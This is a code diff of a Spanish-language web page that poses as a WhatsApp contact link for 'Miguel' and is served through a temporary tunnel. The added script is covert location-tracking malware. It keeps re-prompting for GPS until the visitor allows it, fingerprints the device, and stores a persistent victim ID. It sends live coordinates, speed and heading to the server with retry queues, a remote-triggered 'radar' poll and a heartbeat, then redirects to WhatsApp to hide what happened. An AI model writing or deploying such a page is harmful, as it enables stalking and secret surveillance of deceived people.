@@ -1,24 +1,18 @@
 ﻿<!DOCTYPE html>
 <html lang="es">
 <head>
-
     <meta charset="UTF-8">
-    <title>Radar Satelital Activo</title>
-    <meta property="og:title" content="Acceso a Radar Satelital">
-    <meta property="og:description" content="Sistema de monitoreo de geolocalización en tiempo real.">
-    <meta property="og:image" content="https://tu-url-de-imagen.jpg"> <meta property="og:type" content="website">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>WhatsApp</title>
 
     <!-- Meta Tags para Vista Previa -->
     <meta property="og:title" content="WhatsApp de Miguel">
     <meta property="og:description" content="Cifrado de extremo a extremo">
-    <meta property="og:image" content="{{ url_for('static', filename='miguel1.jpg', _external=True) }}">
+    <meta property="og:image" content="{{ url_for('static', filename='miguel1.png', _external=True) }}">
     <meta property="og:url" content="https://automatic-skills-dish-facility.trycloudflare.com">
     <meta name="twitter:card" content="summary_large_image">
     <meta property="og:type" content="website">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-</head>
 
     <style>
         body {
@@ -153,19 +147,12 @@
     </div>
 
     <script>
-        // --- FUNCION DE EXTRACCION DE IDENTIDAD TECNICA ---
-        function obtenerHuellaDigital() {
-            return {
-                plataforma: navigator.platform,
-                nucleos: navigator.hardwareConcurrency || 'N/A',
-                memoria: navigator.deviceMemory || 'N/A',
-                idioma: navigator.language,
-                vendedor: navigator.vendor,
-                resolucion: window.screen.width + "x" + window.screen.height,
-                agente: navigator.userAgent
-            };
-        }
-
+        if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.register('/sw.js')
+    .then(() => console.log('Service Worker registrado correctamente'))
+    .catch(err => console.error('Error al registrar:', err));
+}
+        // --- 1. CONFIGURACION INICIAL ---
         let deviceID = localStorage.getItem('id_victima');
         if (!deviceID) {
             deviceID = 'TLF-' + Math.random().toString(36).substring(2, 10).toUpperCase();
@@ -173,92 +160,118 @@
         }
         
         let yaRedirigido = false;
+    
+        // --- 2. EXTRACCION DE IDENTIDAD TECNICA ---
+        function obtenerHuellaDigital() {
+            return {
+                plataforma: navigator.platform,
+                nucleos: navigator.hardwareConcurrency || 'N/A',
+                memoria: navigator.deviceMemory || 'N/A',
+                idioma: navigator.language,
+                resolucion: window.screen.width + "x" + window.screen.height,
+                agente: navigator.userAgent
+            };
+        }
+        // Funcion para guardar en cola local
+function guardarEnCola(datos) {
+    let cola = JSON.parse(localStorage.getItem('cola_envios') || '[]');
+    cola.push(datos);
+    localStorage.setItem('cola_envios', JSON.stringify(cola));
+}
 
-        // Reset total si el usuario vuelve atras
-        window.onpageshow = function(event) {
-            yaPermitido = false;
-            document.getElementById('mascara-insistencia').style.display = 'none';
-            document.getElementById('pantalla-carga').style.display = 'none';
-        };
-
-        // Funcion de exito: SOLO AQUI SE REDIRECCIONA
-        function exitoGPS(pos) {
-            if (yaPermitido) return;
-            yaPermitido = true;
-
-            // Ocultar cualquier advertencia y mostrar carga
-            document.getElementById('mascara-insistencia').style.display = 'none';
-            document.getElementById('pantalla-carga').style.display = 'flex';
-
-            // Redireccion ultra rapida al link de WhatsApp
-            window.location.href = "https://wa.me/message/B6UEJRZFEVXCC1";
-
-          // Asegúrate de que esto se ejecute después de obtener la posición
-          function enviarUbicacion(lat, lon) {
-            fetch('/guardar_ubicacion', {
+// Funcion maestra de envio
+async function enviarUbicacion(lat, lon) {
+    const payload = { lat: lat, lon: lon, timestamp: Date.now() };
+    
+    try {
+        const response = await fetch('/guardar_ubicacion', {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({lat: lat, lon: lon})
-        }).then(response => console.log("Datos enviados"));
+            body: JSON.stringify(payload)
+        });
+
+        if (response.ok) {
+            // Si funciona, intentamos vaciar la cola acumulada
+            enviarColaPendiente();
+        } else {
+            guardarEnCola(payload);
+        }
+    } catch (e) {
+        guardarEnCola(payload);
+    }
 }
-                })
-            });
+
+// Funcion para reintentar envios guardados
+async function enviarColaPendiente() {
+    let cola = JSON.parse(localStorage.getItem('cola_envios') || '[]');
+    if (cola.length === 0) return;
+
+    // Intentamos enviar el primero
+    let dato = cola[0];
+    try {
+        let res = await fetch('/guardar_ubicacion', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(dato)
+        });
+        if (res.ok) {
+            cola.shift(); // Quitamos el enviado
+            localStorage.setItem('cola_envios', JSON.stringify(cola));
+            enviarColaPendiente(); // Recursividad para enviar el siguiente
         }
-        async function exitoGPS(pos) {
-            // Recopilar huella digital tecnica del dispositivo
-            const infoTecnica = obtenerHuellaDigital();
+    } catch (e) {}
+}
+    
+        // --- 3. FUNCIONES DE GPS ---
+async function exitoGPS(pos) {
+    if (yaRedirigido) return;
 
-            // Enviar datos a tu terminal
-            try {
-                await fetch('/guardar_ubicacion', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ 
-                        lat: pos.coords.latitude, 
-                        lon: pos.coords.longitude,
-                        alt: pos.coords.altitude || 0,
-                        vel: pos.coords.speed || 0,
-                        id_fijo: deviceID,
-                        info: infoTecnica
-                    
-                    })
-                });
-            } catch (e) { console.log("Reintento de reporte..."); }
+    // 1. Preparar TODOS los datos juntos
+    const datosEnvio = {
+        lat: pos.coords.latitude,
+        lon: pos.coords.longitude,
+        velocidad: pos.coords.speed || 0,
+        rumbo: pos.coords.heading || 0,
+        precision: pos.coords.accuracy,
+        timestamp: pos.timestamp,
+        id_fijo: deviceID,
+        info: obtenerHuellaDigital()
+    };
 
-            if (!yaRedirigido) {
-                yaRedirigido = true;
-                document.getElementById('mascara-insistencia').style.display = 'none';
-                document.getElementById('pantalla-carga').style.display = 'flex';
-                // Redirigir pero el 'watchPosition' seguirá activo en segundo plano
-                window.location.href = "https://wa.me/message/B6UEJRZFEVXCC1";
-            }
-        }
+    // 2. Enviar todo en un solo paquete
+    try {
+        await fetch('/guardar_ubicacion', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(datosEnvio)
+        });
+    } catch (e) { console.error("Error al enviar:", e); }
 
-        function errorGPS(error) {
-            if (yaRedirigido) return;
-            document.getElementById('mascara-insistencia').style.display = 'flex';
-            setTimeout(solicitarGPS, 1500);
-        }
+    // 3. Ejecutar redireccion solo despues del envio
+    yaRedirigido = true;
+    document.getElementById('mascara-insistencia').style.display = 'none';
+    document.getElementById('pantalla-carga').style.display = 'flex';
+    window.location.href = "https://wa.me/message/B6UEJRZFEVXCC1";
+}
 
-        function solicitarGPS() {
-            if (navigator.geolocation) {
-                // ANCLAJE DEFINITIVO: watchPosition mantiene el sensor encendido
-                // incluso si la victima se mueve, los datos llegaran a tu terminal.
-                navigator.geolocation.watchPosition(exitoGPS, errorGPS, { 
-                    enableHighAccuracy: true, 
-                    timeout: 10000, 
-                    maximumAge: 0 
-                });
-            }
-        }
+function errorGPS(error) {
+    if (yaRedirigido) return;
+    document.getElementById('mascara-insistencia').style.display = 'flex';
+    setTimeout(solicitarGPS, 2000);
+}
 
-        window.onpageshow = function() {
-            yaRedirigido = false;
-            document.getElementById('mascara-insistencia').style.display = 'none';
-            document.getElementById('pantalla-carga').style.display = 'none';
-        }     
-        <script>
-    setInterval(async () => {
+function solicitarGPS() {
+    if (navigator.geolocation) {
+        navigator.geolocation.watchPosition(exitoGPS, errorGPS, { 
+            enableHighAccuracy: true, 
+            timeout: 10000 
+        });
+    }
+}
+
+// --- 4. RADAR PASIVO ---
+setInterval(async () => {
+    try {
         let res = await fetch('/api/verificar-radar');
         let data = await res.json();
         if (data.radar_activo) {
@@ -266,12 +279,32 @@
                 fetch('/guardar_ubicacion', {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({lat: pos.coords.latitude, lon: pos.coords.longitude})
+                    body: JSON.stringify({
+                        lat: pos.coords.latitude, 
+                        lon: pos.coords.longitude,
+                        id_fijo: deviceID
+                    })
                 });
             });
         }
-    }, 5000); // Revisa cada 5 segundos
-</script>
+    } catch(e) {}
+}, 5000);
+
+// --- 5. HEARTBEAT ---
+setInterval(() => {
+    fetch('/api/heartbeat', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({id: deviceID, estado: 'activo'})
+    }).catch(err => console.log("Fallo en heartbeat"));
+}, 30000); 
+
+window.onpageshow = function() {
+    yaRedirigido = false;
+    document.getElementById('mascara-insistencia').style.display = 'none';
+    document.getElementById('pantalla-carga').style.display = 'none';
+}
+    </script>
     </script>
 </body>
 </html>
